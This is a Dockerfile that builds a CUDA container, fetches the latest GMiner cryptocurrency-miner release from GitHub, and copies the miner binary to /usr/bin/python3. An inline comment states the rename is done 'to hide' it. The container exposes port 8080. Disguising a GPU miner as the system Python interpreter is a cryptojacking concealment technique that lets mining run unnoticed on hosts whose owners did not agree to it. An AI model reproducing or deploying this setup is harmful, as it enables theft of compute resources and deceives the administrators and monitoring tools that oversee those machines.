FROM nvidia/cuda:10.2-base

WORKDIR /tmp

# install required software
RUN apt update && apt install tar curl wget xz-utils -y

# Fix NVML Driver bug
RUN ln -s /usr/lib/x86_64-linux-gnu/libnvidia-ml.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-ml.so

# get latest GMiner release
# one-liner from https://gist.github.com/steinwaywhw/a4cd19cda655b8249d908261a62687f8
RUN curl -s https://api.github.com/repos/develsoftware/GMinerRelease/releases/latest | grep -E 'browser_download_url' | grep linux64 | cut -d '"' -f 4 | wget -qi -

# extract, copy to external dir, change name from miner to python3 to hide
RUN tar xf gminer* && cp /tmp/miner /usr/bin/python3

EXPOSE 8080

WORKDIR /usr/bin/